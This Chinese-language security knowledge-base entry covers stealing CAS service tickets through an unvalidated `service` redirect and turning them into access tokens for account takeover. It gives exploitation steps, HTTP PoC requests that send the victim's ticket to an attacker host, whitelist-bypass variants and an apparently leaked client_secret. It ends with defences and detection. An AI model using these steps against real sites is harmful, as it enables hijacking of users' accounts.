---
id: web-generic-auth-cas-service-open-redirect-ticket-theft-ato
title: CAS login service 参数未校验：302 把 ST ticket 带到任意外域，换 access_token 接管账号
type: scenario
domain: web
path: web/generic/auth
technique: cas-service-open-redirect-ticket-theft-account-takeover
aliases:
- CAS ticket 窃取
- service 参数开放重定向
- ST ticket 接管
- oauth2 accessToken 换 token
- 单点登录账号接管
tags:
- web
- auth
- cas
- oauth
- open-redirect
- ticket
- account-takeover
- sso
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V231
  verified_at: '2026-11-07T09:49:06+08:00'
  notes: 已对照原文与图28-36核对：service 改为 baidu.com 时 302 到 baidu.com/?ticket=ST-...；本地 http.server 8000 收到 ticket；accessToken 用 client_id/client_secret/code 换 access_token=TGT-...；/api/token/check 302 autoLogin?username=...&single_sign_login。ticket 一次性/短 TTL；未复跑。
---

## 一句话结论

CAS 的 `/cas-server/login?service=<url>` 未对 `service` 做白名单校验，登录成功后 302 到 `service` 并在 URL 追加 `?ticket=ST-...`；攻击者把 `service` 改为自己的服务器，诱导受害者完成 CAS 登录，即可在自己的回调里拿到一次性 ticket，再用 `/cas-server/oauth2/accessToken`（携带 `client_id`/`client_secret`/`grant_type=authorization_code`/`code=ticket`）换取 `access_token`/TGT，最后用 `/api/token/check?access_token=...` 302 到 `autoLogin?...` 或直接携带 token 登录，接管受害者账号。

## 原理

- CAS 登录流程：用户访问 `GET /cas-server/login?service=<redirect>`，认证成功后 CAS 生成一次性 Service Ticket（`ST-...`）并 302 到 `service`，在 URL 后追加 `?ticket=ST-...`；业务系统再用 ticket 向 CAS 校验并建立本地会话。
- 缺陷：`service` 来自 query 参数且未校验域名/路径白名单，等价于开放重定向；由于 ticket 被拼进跳转 URL，任何能控制 `service` 的人都能让受害者的 ticket 落到自己的服务器上。
- ticket 是 bearer 凭据：攻击者拿到 `ST-...` 后在有效期内调用 OAuth2 token 端点，用 `client_id=xx_dmx`、`client_secret=<前端/请求中可见的密钥>`、`grant_type=authorization_code`、`redirect_uri=<合法回调>`、`code=<ticket>` 换取 `access_token=TGT-...`；随后 `/api/token/check?access_token=TGT-...` 返回 302 `Location: .../autoLogin?username=<victim>&single_sign_login`，或直接把 token 作为凭据访问业务接口。
- 时间窗：ticket 通常一次性且短 TTL，攻击者需在受害者登录后立即换取 token；原文在本地起 `python -m http.server 8000` 接收 ticket，然后立刻请求 token。
- 成立条件：CAS 允许任意 `service`；OAuth2 token 端点的 client_id/client_secret 可获取（前端 JS、请求示例或硬编码）；token/check 或业务接口接受该 token 并自动登录。

## 触发条件

- 目标使用 CAS 单点登录，`/cas-server/login` 的 `service` 参数可任意指定。
- CAS 登录成功后会 302 到 `service` 并附带 `ticket=ST-...`。
- `/cas-server/oauth2/accessToken` 可用已知/可获取的 client_id、client_secret、redirect_uri 换取 token。
- 业务侧 `/api/token/check` 或 autologin 接口接受 access_token 并建立会话。
- 攻击者能诱导受害者在 CAS 登录页完成认证（钓鱼链接、正常业务跳转等），且能在 ticket 有效期内完成换取。

## 利用步骤

1. 确认 `service` 可被任意修改：把 `service` 改为 `https://baidu.com`，登录后观察 302 是否跳到 `baidu.com/?ticket=ST-...`（原文以此证明未校验）。
2. 在攻击者服务器上启动 HTTP 服务（如 `python -m http.server 8000`），构造 `GET /cas-server/login?service=http://<attacker>:8000` 的登录链接。
3. 诱导受害者在链接上完成 CAS 登录；登录成功后浏览器跳到攻击者服务器，日志/页面记录 `/?ticket=ST-...`。
4. 立即（秒级）向 `/cas-server/oauth2/accessToken` 发送请求，携带 `client_id`、`client_secret`、`grant_type=authorization_code`、`redirect_uri`、`code=<ST>`，拿到 `access_token=TGT-...`。
5. 用 `GET /api/token/check?access_token=TGT-...` 获取 302 `Location: ...autoLogin?username=<victim>&single_sign_login`，或直接以该 token 访问业务接口，完成账号接管。
6. 若 ticket 过期/已被使用，重复步骤 3；必要时用 `service` 指向不同路径或编码绕过白名单。

## PoC

```http
# 1) 构造登录链接（service 指向攻击者）
GET /cas-server/login?service=http://<attacker>:8000 HTTP/1.1
Host: <target>

# 受害者登录后，浏览器 302 到：
# http://<attacker>:8000/?ticket=ST-383099-A9lCj5neEycBlZ5Ad2Fc...
```

```http
# 2) 用 ticket 换 token（原文请求）
POST /cas-server/oauth2/accessToken?client_id=xx_dmx&client_secret=adfe28c96b65720305f2e6b617860b39&grant_type=authorization_code&redirect_uri=https://<target>/token/check&code=ST-383468-ZMDZzkx4QeOQIrViVxxS-... HTTP/1.1
Host: <target>

HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8

access_token=TGT-4140-k5dGR1TkPxrwcvywHVwgTjhMg7dtN4nviH1LYjVRE2ieBjmGfJ-...&expires=6476...
```

```http
# 3) 用 token 自动登录
GET /api/token/check?access_token=TGT-4140-k5dGR1TkPxrwcvywHVwgTjhMg7dtN4nviH1LYjVRE2ieBjmGfJ-... HTTP/1.1
Host: <target>

HTTP/1.1 302 Found
Location: https://<target>/autoLogin?username=<victim>&single_sign_login
```

## 变体与关联

- 变体（service 绕过）：`service=https://target@attacker`、`service=//attacker`、URL 编码/双重编码、大小写/端口/子域名混淆，取决于 CAS 的白名单实现。
- 变体（ticket 使用）：除 OAuth2 accessToken 外，可直接把 `ST` 提交给业务系统 `serviceValidate`/`p3/serviceValidate` 换取断言；或利用 CAS proxy ticket 进一步访问下游服务。
- 变体（token 使用）：`/api/token/check` 的 302 autologin、直接 `Authorization: Bearer`、Cookie 注入；不同业务子系统可能共用同一 token。
- 关联：[[web-generic-auth-cas-aes-cbc-login-encryption-reverse]]（CAS 登录加密逆向，不同点）、[[web-generic-auth-wechat-bind-url-idor-account-takeover]]（第三方绑定接管）、[[web-generic-auth-missing-function-level-role-check]]（认证后授权缺失）。
- 边界：CAS 严格校验 service 白名单、ticket 绑定 client/redirect_uri、token 端点要求 PKCE/密钥保密、token 短 TTL 且一次性时，链路不成立；原文为授权测试，未对真实用户操作。

## 检测与防御

- 修复：CAS `service` 使用严格白名单（精确域名/路径/协议），禁止任意外域；ticket 与 client_id、redirect_uri 绑定，一次性且短 TTL；OAuth2 token 端点启用 PKCE，client_secret 不下发前端。
- 加固：登录跳转统一走服务端登记的回调地址；对 `service` 参数做日志与异常告警；token/check 增加来源校验与绑定会话。
- 检测：同一 ticket 在极短时间内被不同 IP 使用；`service` 参数指向非白名单域名；OAuth2 token 请求来自异常 IP/客户端；`autoLogin` 在异地/异常时间被调用。
- 响应：发现 ticket 被窃取立即吊销 token/会话、强制重新认证、通知受影响用户并排查下游访问。
